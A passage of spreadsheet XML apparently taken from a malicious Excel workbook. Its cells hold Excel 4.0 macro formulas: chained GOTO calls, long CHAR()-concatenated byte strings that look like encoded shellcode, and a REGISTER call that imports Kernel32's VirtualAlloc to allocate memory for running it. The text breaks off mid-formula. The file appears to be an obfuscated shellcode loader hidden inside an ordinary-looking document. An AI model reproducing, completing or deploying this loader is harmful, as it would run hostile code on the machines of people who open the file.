HAR(183)&amp;CHAR(164)&amp;CHAR(147)&amp;CHAR(184)&amp;CHAR(39)&amp;CHAR(26)&amp;CHAR(182)&amp;CHAR(64)&amp;CHAR(172)&amp;CHAR(84)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(200)&amp;CHAR(123)&amp;CHAR(168)&amp;CHAR(37)&amp;CHAR(231)&amp;CHAR(121)&amp;CHAR(130)&amp;CHAR(97)&amp;CHAR(134)&amp;CHAR(67)&amp;CHAR(37)&amp;CHAR(131)&amp;CHAR(31)&amp;CHAR(88)&amp;CHAR(97)&amp;CHAR(226)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(136)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)</f>
        <v>i§ÐõédTeû›Ëd_x001F_Î ¼Y„„~_x0013_œ,ëûÑù_x001D_&gt;ì_x000C_qak[ˆ÷iÙ§Ökåk9–_x0012_&gt;Ú$I7È©äeƒT³‚y_x0002_Ghvi‹wÇ_x0002_Wô?œ_x0008_&gt;|QííG	ÅàF‡µ[Üè…$_x0008_g´Ub/×7M|^»w_x0016_Ü~_x0002_ØO¢_x000C_ŸO_x001D_l²|±_x0002_QþºÚ÷#ƒBQ—}_x0015_’køDÔ‚·¤“¸'_x001A_¶@¬TÍ_x0005_È{¨%çy‚a†C%ƒ_x001F_Xaâ/)ˆ	_x0002__x0002__x0002__x0006__x0005_		_x0005__x0005__x000D__x000E__x000F__x0002__x0004__x0001__x0002__x000B_
_x0002__x000B__x000B__x0002__x0006__x0005__x0007__x000B__x0005_
_x000D__x0002_
_x0002__x0005__x0007__x0016__x0004__x0001__x0001__x0002__x000F_
	_x0006__x0004__x0003__x0007__x0007__x000E__x0005__x000B__x0004__x0007__x0007__x000B_
	_x000D__x0006__x000F__x000B_
	_x0007__x0005__x0007_
	_x0002__x0002__x0002__x0006__x0005_		_x0005__x0005__x000D__x000E__x000F__x0002__x0004__x0001_</v>
      </c>
      <c r="C2" t="str">
        <f>CHAR(72)&amp;CHAR(141)&amp;CHAR(5)&amp;CHAR(239)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(72)&amp;CHAR(187)&amp;CHAR(122)</f>
        <v>H_x0005_ïÿÿÿH»z</v>
      </c>
    </row>
    <row r="3" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A3" t="b">
        <f>GOTO(A4)</f>
        <v>0</v>
      </c>
      <c r="B3" t="str">
        <f>CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(202)&amp;CHAR(9)&amp;CHAR(237)&amp;CHAR(25)&amp;CHAR(185)&amp;CHAR(119)&amp;CHAR(37)&amp;CHAR(143)&amp;CHAR(67)&amp;CHAR(107)&amp;CHAR(184)&amp;CHAR(100)&amp;CHAR(114)&amp;CHAR(238)&amp;CHAR(232)&amp;CHAR(56)&amp;CHAR(72)&amp;CHAR(162)&amp;CHAR(213)&amp;CHAR(56)&amp;CHAR(248)&amp;CHAR(142)&amp;CHAR(149)&amp;CHAR(65)&amp;CHAR(88)&amp;CHAR(96)&amp;CHAR(200)&amp;CHAR(60)&amp;CHAR(41)&amp;CHAR(218)&amp;CHAR(245)&amp;CHAR(145)&amp;CHAR(135)&amp;CHAR(159)&amp;CHAR(75)&amp;CHAR(106)&amp;CHAR(51)&amp;CHAR(213)&amp;CHAR(17)&amp;CHAR(17)&amp;CHAR(246)&amp;CHAR(188)&amp;CHAR(159)&amp;CHAR(46)&amp;CHAR(146)&amp;CHAR(245)&amp;CHAR(37)&amp;CHAR(226)&amp;CHAR(187)&amp;CHAR(255)&amp;CHAR(173)&amp;CHAR(52)&amp;CHAR(225)&amp;CHAR(12)&amp;CHAR(159)&amp;CHAR(242)&amp;CHAR(210)&amp;CHAR(110)&amp;CHAR(77)&amp;CHAR(134)&amp;CHAR(228)&amp;CHAR(252)&amp;CHAR(60)&amp;CHAR(102)&amp;CHAR(167)&amp;CHAR(210)&amp;CHAR(102)&amp;CHAR(104)&amp;CHAR(116)&amp;CHAR(34)&amp;CHAR(91)&amp;CHAR(176)&amp;CHAR(175)&amp;CHAR(219)&amp;CHAR(239)&amp;CHAR(162)&amp;CHAR(92)&amp;CHAR(68)&amp;CHAR(208)&amp;CHAR(87)&amp;CHAR(54)&amp;CHAR(136)&amp;CHAR(26)&amp;CHAR(46)&amp;CHAR(2)&amp;CHAR(51)&amp;CHAR(140)&amp;CHAR(196)&amp;CHAR(148)&amp;CHAR(177)</f>
        <v>_x0002__x000B_
_x0002__x000B__x000B__x0002__x0006__x0005__x0007__x000B__x0005_
_x000D__x0002_
_x0002__x0005__x0007__x0016__x0004__x0001__x0001__x0002__x000F_
	_x0006__x0004__x0003__x0007__x0007__x000E__x0005__x000B__x0004__x0007__x0007__x000B_
	_x000D__x0006__x000F__x000B_
	_x0007__x0005__x0007_
	_x0002__x0002__x0002__x0006__x0005_		_x0005__x0005__x000D__x000E__x000F__x0002__x0004__x0001__x0002__x000B_
_x0002__x000B__x000B__x0002__x0006__x0005__x0007__x000B__x0005_
_x000D__x0002_
_x0002__x0005__x0007__x0016__x0004__x0001__x0001__x0002__x000F_
	_x0006__x0004__x0003__x0007__x0007__x000E__x0005__x000B__x0004__x0007__x0007__x000B_
	_x000D__x0006__x000F__x000B_
	_x0007__x0005__x0007_
	_x0002__x0002__x0002__x0006__x0005_		_x0005__x0005__x000D__x000E__x000F__x0002__x0004__x0001__x0002__x000B_
_x0002__x000B__x000B__x0002__x0006__x0005__x0007__x000B__x0005_
_x000D__x0002_
_x0002__x0005__x0007__x0016__x0004__x0001__x0001__x0002__x000F_
	_x0006__x0004__x0003__x0007_Ê	í_x0019_¹w%Ck¸drîè8H¢Õ8øŽ•AX`È&lt;)Úõ‘‡ŸKj3Õ_x0011__x0011_ö¼Ÿ.’õ%â»ÿ­4á_x000C_ŸòÒnM†äü&lt;f§Òfht"[°¯Ûï¢\DÐW6ˆ_x001A_._x0002_3ŒÄ”±</v>
      </c>
      <c r="C3" t="str">
        <f>CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(72)&amp;CHAR(49)&amp;CHAR(88)</f>
        <v>ˆê‘[¸ôqH1X</v>
      </c>
    </row>
    <row r="4" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A4" t="b">
        <f>GOTO(A5)</f>
        <v>0</v>
      </c>
      <c r="B4" t="str">
        <f>CHAR(147)&amp;CHAR(179)&amp;CHAR(124)&amp;CHAR(186)&amp;CHAR(252)&amp;CHAR(91)&amp;CHAR(212)&amp;CHAR(190)&amp;CHAR(122)&amp;CHAR(208)&amp;CHAR(138)&amp;CHAR(22)&amp;CHAR(174)&amp;CHAR(224)&amp;CHAR(198)&amp;CHAR(78)&amp;CHAR(177)&amp;CHAR(69)&amp;CHAR(71)&amp;CHAR(228)&amp;CHAR(41)&amp;CHAR(224)&amp;CHAR(132)&amp;CHAR(20)&amp;CHAR(121)&amp;CHAR(199)&amp;CHAR(245)&amp;CHAR(192)&amp;CHAR(244)&amp;CHAR(178)&amp;CHAR(105)&amp;CHAR(207)&amp;CHAR(27)&amp;CHAR(39)&amp;CHAR(67)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(121)&amp;CHAR(126)&amp;CHAR(114)&amp;CHAR(178)&amp;CHAR(5)&amp;CHAR(210)&amp;CHAR(231)&amp;CHAR(24)&amp;CHAR(114)&amp;CHAR(110)&amp;CHAR(131)&amp;CHAR(140)&amp;CHAR(247)&amp;CHAR(81)&amp;CHAR(201)&amp;CHAR(157)&amp;CHAR(128)&amp;CHAR(236)&amp;CHAR(136)&amp;CHAR(72)&amp;CHAR(183)&amp;CHAR(168)&amp;CHAR(65)&amp;CHAR(21)&amp;CHAR(129)&amp;CHAR(108)&amp;CHAR(33)&amp;CHAR(194)&amp;CHAR(169)&amp;CHAR(212)&amp;CHAR(105)&amp;CHAR(71)&amp;CHAR(185)&amp;CHAR(17)&amp;CHAR(166)&amp;CHAR(184)&amp;CHAR(218)&amp;CHAR(42)&amp;CHAR(212)&amp;CHAR(64)&amp;CHAR(177)&amp;CHAR(194)&amp;CHAR(61)&amp;CHAR(16)&amp;CHAR(27)&amp;CHAR(195)&amp;CHAR(87)&amp;CHAR(113)&amp;CHAR(192)&amp;CHAR(246)&amp;CHAR(164)&amp;CHAR(131)&amp;CHAR(175)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(150)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(111)&amp;CHAR(55)&amp;CHAR(81)&amp;CHAR(58)&amp;CHAR(224)&amp;CHAR(203)&amp;CHAR(211)&amp;CHAR(129)&amp;CHAR(117)&amp;CHAR(111)&amp;CHAR(237)&amp;CHAR(159)&amp;CHAR(215)&amp;CHAR(81)&amp;CHAR(92)&amp;CHAR(105)&amp;CHAR(119)&amp;CHAR(35)&amp;CHAR(100)&amp;CHAR(192)&amp;CHAR(41)&amp;CHAR(219)&amp;CHAR(186)&amp;CHAR(75)&amp;CHAR(144)&amp;CHAR(16)&amp;CHAR(139)&amp;CHAR(150)&amp;CHAR(19)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(78)&amp;CHAR(52)&amp;CHAR(177)&amp;CHAR(150)&amp;CHAR(104)&amp;CHAR(126)&amp;CHAR(96)&amp;CHAR(253)&amp;CHAR(200)&amp;CHAR(164)&amp;CHAR(165)&amp;CHAR(145)&amp;CHAR(213)&amp;CHAR(46)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(143)&amp;CHAR(53)&amp;CHAR(255)&amp;CHAR(166)&amp;CHAR(95)&amp;CHAR(40)&amp;CHAR(190)&amp;CHAR(26)&amp;CHAR(85)&amp;CHAR(201)&amp;CHAR(164)&amp;CHAR(27)&amp;CHAR(110)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(181)&amp;CHAR(135)&amp;CHAR(38)&amp;CHAR(228)&amp;CHAR(226)&amp;CHAR(21)&amp;CHAR(220)&amp;CHAR(213)&amp;CHAR(93)&amp;CHAR(242)&amp;CHAR(71)&amp;CHAR(251)&amp;CHAR(148)&amp;CHAR(121)&amp;CHAR(59)&amp;CHAR(25)&amp;CHAR(115)&amp;CHAR(4)&amp;CHAR(148)&amp;CHAR(200)&amp;CHAR(202)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(150)&amp;CHAR(177)&amp;CHAR(75)&amp;CHAR(143)&amp;CHAR(171)&amp;CHAR(85)&amp;CHAR(176)&amp;CHAR(237)&amp;CHAR(142)&amp;CHAR(184)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(242)&amp;CHAR(135)&amp;CHAR(44)&amp;CHAR(36)&amp;CHAR(151)&amp;CHAR(177)&amp;CHAR(112)&amp;CHAR(234)&amp;CHAR(185)&amp;CHAR(63)&amp;CHAR(74)&amp;CHAR(115)&amp;CHAR(52)&amp;CHAR(166)&amp;CHAR(31)&amp;CHAR(253)&amp;CHAR(66)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(218)&amp;CHAR(223)&amp;CHAR(37)&amp;CHAR(102)&amp;CHAR(60)&amp;CHAR(107)&amp;CHAR(93)&amp;CHAR(74)&amp;CHAR(53)&amp;CHAR(68)&amp;CHAR(83)&amp;CHAR(73)&amp;CHAR(132)&amp;CHAR(19)&amp;CHAR(48)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(217)&amp;CHAR(59)&amp;CHAR(147)&amp;CHAR(188)&amp;CHAR(222)&amp;CHAR(76)&amp;CHAR(40)&amp;CHAR(28)&amp;CHAR(142)&amp;CHAR(244)&amp;CHAR(5)&amp;CHAR(88)&amp;CHAR(238)&amp;CHAR(165)&amp;CHAR(224)&amp;CHAR(97)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(68)&amp;CHAR(187)&amp;CHAR(168)&amp;CHAR(104)&amp;CHAR(201)&amp;CHAR(13)&amp;CHAR(239)</f>
        <v>“³|ºü[Ô¾zÐŠ_x0016_®àÆN±EGä)à„_x0014_yÇõÀô²iÏ_x001B_'Cñ¾y~r²_x0005_Òç_x0018_rnƒŒ÷QÉ€ìˆH·¨A_x0015_l!Â©ÔiG¹_x0011_¦¸Ú*Ô@±Â=_x0010__x001B_ÃWqÀö¤ƒ¯€é–È°o7Q:àËÓuoíŸ×Q\iw#dÀ)ÛºK_x0010_‹–_x0013_7ŸN4±–h~`ýÈ¤¥‘Õ.U&amp;5ÿ¦_(¾_x001A_UÉ¤_x001B_n§ûµ‡&amp;äâ_x0015_ÜÕ]òGû”y;_x0019_s_x0004_”ÈÊ_x0002__x0002_–±K«U°íŽ¸_x000B__x000E_ò‡,$—±pê¹?Js4¦_x001F_ýBZ]Úß%f&lt;k]J5DSI„_x0013_0_x000D__x0004_Ù;“¼ÞL(_x001C_Žô_x0005_Xî¥àaõÞâdD»¨hÉ_x000D_ï</v>
      </c>
      <c r="C4" t="str">
        <f>CHAR(39)&amp;CHAR(72)&amp;CHAR(45)&amp;CHAR(248)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(226)&amp;CHAR(244)&amp;CHAR(50)</f>
        <v>'H-øÿÿÿâô2</v>
      </c>
    </row>
    <row r="5" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A5" t="b">
        <f>GOTO(A6)</f>
        <v>0</v>
      </c>
      <c r="B5" t="str">
        <f>CHAR(37)&amp;CHAR(47)&amp;CHAR(158)&amp;CHAR(207)&amp;CHAR(39)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(12)&amp;CHAR(151)&amp;CHAR(86)&amp;CHAR(240)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(26)&amp;CHAR(242)&amp;CHAR(102)&amp;CHAR(251)&amp;CHAR(121)&amp;CHAR(202)&amp;CHAR(162)&amp;CHAR(158)&amp;CHAR(78)&amp;CHAR(221)&amp;CHAR(32)&amp;CHAR(51)&amp;CHAR(230)&amp;CHAR(34)&amp;CHAR(69)&amp;CHAR(39)&amp;CHAR(137)&amp;CHAR(146)&amp;CHAR(27)&amp;CHAR(97)&amp;CHAR(77)&amp;CHAR(49)&amp;CHAR(254)&amp;CHAR(122)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(177)&amp;CHAR(186)&amp;CHAR(234)&amp;CHAR(97)&amp;CHAR(161)&amp;CHAR(13)&amp;CHAR(99)&amp;CHAR(135)&amp;CHAR(200)&amp;CHAR(66)&amp;CHAR(242)&amp;CHAR(124)&amp;CHAR(129)&amp;CHAR(67)&amp;CHAR(138)&amp;CHAR(189)&amp;CHAR(182)&amp;CHAR(36)&amp;CHAR(206)&amp;CHAR(230)&amp;CHAR(6)&amp;CHAR(220)&amp;CHAR(188)&amp;CHAR(153)&amp;CHAR(242)&amp;CHAR(242)&amp;CHAR(39)&amp;CHAR(231)&amp;CHAR(56)&amp;CHAR(105)&amp;CHAR(149)&amp;CHAR(99)&amp;CHAR(98)&amp;CHAR(66)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(255)&amp;CHAR(189)&amp;CHAR(242)&amp;CHAR(9)&amp;CHAR(104)&amp;CHAR(202)&amp;CHAR(249)&amp;CHAR(192)&amp;CHAR(212)&amp;CHAR(251)&amp;CHAR(183)&amp;CHAR(136)&amp;CHAR(161)&amp;CHAR(162)&amp;CHAR(241)&amp;CHAR(172)&amp;CHAR(106)&amp;CHAR(167)&amp;CHAR(25)&amp;CHAR(213)&amp;CHAR(76)&amp;CHAR(198)&amp;CHAR(153)&amp;CHAR(250)&amp;CHAR(83)&amp;CHAR(59)&amp;CHAR(99)&amp;CHAR(253)&amp;CHAR(186)&amp;CHAR(189)&amp;CHAR(101)&amp;CHAR(90)&amp;CHAR(224)&amp;CHAR(123)&amp;CHAR(155)&amp;CHAR(18)&amp;CHAR(248)&amp;CHAR(247)&amp;CHAR(19)&amp;CHAR(101)&amp;CHAR(185)&amp;CHAR(150)&amp;CHAR(101)&amp;CHAR(125)&amp;CHAR(97)&amp;CHAR(36)&amp;CHAR(35)&amp;CHAR(22)&amp;CHAR(207)&amp;CHAR(212)&amp;CHAR(192)&amp;CHAR(197)&amp;CHAR(1)&amp;CHAR(242)&amp;CHAR(44)&amp;CHAR(147)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(59)&amp;CHAR(114)&amp;CHAR(134)&amp;CHAR(58)&amp;CHAR(91)&amp;CHAR(98)&amp;CHAR(99)&amp;CHAR(226)&amp;CHAR(197)&amp;CHAR(184)&amp;CHAR(112)&amp;CHAR(68)&amp;CHAR(176)&amp;CHAR(99)&amp;CHAR(83)&amp;CHAR(216)&amp;CHAR(60)&amp;CHAR(54)&amp;CHAR(204)&amp;CHAR(43)&amp;CHAR(127)&amp;CHAR(250)&amp;CHAR(91)&amp;CHAR(68)&amp;CHAR(136)&amp;CHAR(196)&amp;CHAR(106)&amp;CHAR(61)&amp;CHAR(162)&amp;CHAR(113)&amp;CHAR(144)&amp;CHAR(200)&amp;CHAR(208)&amp;CHAR(254)&amp;CHAR(55)&amp;CHAR(82)&amp;CHAR(150)&amp;CHAR(55)&amp;CHAR(72)&amp;CHAR(129)&amp;CHAR(113)&amp;CHAR(64)&amp;CHAR(167)&amp;CHAR(251)&amp;CHAR(214)&amp;CHAR(238)&amp;CHAR(127)&amp;CHAR(233)&amp;CHAR(194)&amp;CHAR(128)&amp;CHAR(90)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(169)&amp;CHAR(187)&amp;CHAR(8)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(58)&amp;CHAR(61)&amp;CHAR(53)&amp;CHAR(91)&amp;CHAR(98)&amp;CHAR(131)&amp;CHAR(110)&amp;CHAR(43)&amp;CHAR(161)&amp;CHAR(38)&amp;CHAR(188)&amp;CHAR(152)&amp;CHAR(1)&amp;CHAR(56)&amp;CHAR(159)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(245)&amp;CHAR(119)&amp;CHAR(107)&amp;CHAR(1)&amp;CHAR(106)&amp;CHAR(148)&amp;CHAR(237)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(53)&amp;CHAR(147)&amp;CHAR(137)&amp;CHAR(92)&amp;CHAR(29)&amp;CHAR(202)&amp;CHAR(84)&amp;CHAR(52)&amp;CHAR(90)&amp;CHAR(110)&amp;CHAR(148)&amp;CHAR(73)&amp;CHAR(200)&amp;CHAR(51)&amp;CHAR(147)&amp;CHAR(178)&amp;CHAR(89)&amp;CHAR(185)&amp;CHAR(178)&amp;CHAR(78)&amp;CHAR(16)&amp;CHAR(40)&amp;CHAR(247)&amp;CHAR(168)&amp;CHAR(220)&amp;CHAR(72)&amp;CHAR(184)&amp;CHAR(41)&amp;CHAR(55)&amp;CHAR(21)&amp;CHAR(220)&amp;CHAR(15)&amp;CHAR(206)&amp;CHAR(176)&amp;CHAR(51)&amp;CHAR(84)&amp;CHAR(33)</f>
        <v>%/žÏ'0Ø_x000C_—Vð_x001F__x001A_òfûyÊ¢žNÝ 3æ"E'‰’_x001B_aM1þzßý±ºêa¡_x000D_c‡ÈBò|CŠ½¶$Îæ_x0006_Ü¼™òò'ç8i•cbB_x0016_Uÿ½ò	hÊùÀÔû·ˆ¡¢ñ¬j§_x0019_ÕLÆ™úS;cýº½eZà{›_x0012_ø÷_x0013_e¹–e}a$#_x0016_ÏÔÀÅ_x0001_ò,“_x001A_‰;r†:[bcâÅ¸pD°cSØ&lt;6Ì+ú[DˆÄj=¢qÈÐþ7R–7Hq@§ûÖîéÂ€ZR€Ë©»_x0008_‡‹:=5[bƒn+¡&amp;¼˜_x0001_8Ÿ_x000D__x000E_õwk_x0001_j”í«&gt;5“‰\_x001D_ÊT4Zn”IÈ3“²Y¹²N_x0010_(÷¨ÜH¸)7_x0015_Ü_x000F_Î°3T!</v>
      </c>
      <c r="C5" t="str">
        <f>CHAR(11)&amp;CHAR(6)&amp;CHAR(233)&amp;CHAR(62)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(69)&amp;CHAR(95)&amp;CHAR(184)&amp;CHAR(234)</f>
        <v>_x000B__x0006_é&gt;ðE_¸ê</v>
      </c>
    </row>
    <row r="6" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A6" t="b">
        <f>REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B6" t="str">
        <f>CHAR(8)&amp;CHAR(114)&amp;CHAR(143)&amp;CHAR(164)&amp;CHAR(176)&amp;CHAR(16)&amp;CHAR(30)&amp;CHAR(79)&amp;CHAR(56)&amp;CHAR(168)&amp;CHAR(85)&amp;CHAR(39)&amp;CHAR(17)&amp;CHAR(49)&amp;CHAR(238)&amp;CHAR(112)&amp;CHAR(178)&amp;CHAR(29)&amp;CHAR(69)&amp;CHAR(168)&amp;CHAR(103)&amp;CHAR(198)&amp;CHAR(60)&amp;CHAR(219)&amp;CHAR(80)&amp;CHAR(99)&amp;CHAR(94)&amp;CHAR(29)&amp;CHAR(186)&amp;CHAR(26)&amp;CHAR(154)&amp;CHAR(105)&amp;CHAR(94)&amp;CHAR(40)&amp;CHAR(203)&amp;CHAR(117)&amp;CHAR(244)&amp;CHAR(59)&amp;CHAR(239)&amp;CHAR(17)&amp;CHAR(208)&amp;CHAR(129)&amp;CHAR(241)&amp;CHAR(219)&amp;CHAR(229)&amp;CHAR(12)&amp;CHAR(152)&amp;CHAR(79)&amp;CHAR(179)&amp;CHAR(140)&amp;CHAR(99)&amp;CHAR(183)&amp;CHAR(45)&amp;CHAR(206)&amp;CHAR(204)&amp;CHAR(11)&amp;CHAR(15)&amp;CHAR(199)&amp;CHAR(192)&amp;CHAR(41)&amp;CHAR(245)&amp;CHAR(52)&amp;CHAR(202)&amp;CHAR(127)&amp;CHAR(204)&amp;CHAR(92)&amp;CHAR(107)&amp;CHAR(117)&amp;CHAR(8)&amp;CHAR(217)&amp;CHAR(217)&amp;CHAR(20)&amp;CHAR(241)&amp;CHAR(177)&amp;CHAR(23)&amp;CHAR(29)&amp;CHAR(219)&amp;CHAR(225)&amp;CHAR(131)&amp;CHAR(157)&amp;CHAR(98)&amp;CHAR(231)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(236)&amp;CHAR(133)&amp;CHAR(155)&amp;CHAR(241)&amp;CHAR(16)&amp;CHAR(185)&amp;CHAR(61)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(83)&amp;CHAR(32)&amp;CHAR(77)&amp;CHAR(180)&amp;CHAR(14)&amp;CHAR(244)&amp;CHAR(132)&amp;CHAR(46)&amp;CHAR(33)&amp;CHAR(103)&amp;CHAR(236)&amp;CHAR(34)&amp;CHAR(92)&amp;CHAR(229)&amp;CHAR(194)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(133)&amp;CHAR(212)&amp;CHAR(239)&amp;CHAR(86)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(177)&amp;CHAR(91)&amp;CHAR(110)&amp;CHAR(252)&amp;CHAR(66)&amp;CHAR(150)&amp;CHAR(122)&amp;CHAR(61)&amp;CHAR(96)&amp;CHAR(237)&amp;CHAR(191)&amp;CHAR(129)&amp;CHAR(55)&amp;CHAR(26)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(167)&amp;CHAR(97)&amp;CHAR(74)&amp;CHAR(205)&amp;CHAR(96)&amp;CHAR(97)&amp;CHAR(194)&amp;CHAR(175)&amp;CHAR(106)&amp;CHAR(57)&amp;CHAR(155)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(173)&amp;CHAR(207)&amp;CHAR(187)&amp;CHAR(202)&amp;CHAR(158)&amp;CHAR(64)&amp;CHAR(40)&amp;CHAR(230)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(115)&amp;CHAR(75)&amp;CHAR(62)&amp;CHAR(156)&amp;CHAR(39)&amp;CHAR(142)&amp;CHAR(46)&amp;CHAR(217)&amp;CHAR(224)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(89)&amp;CHAR(92)&amp;CHAR(72)&amp;CHAR(172)&amp;CHAR(52)&amp;CHAR(45)&amp;CHA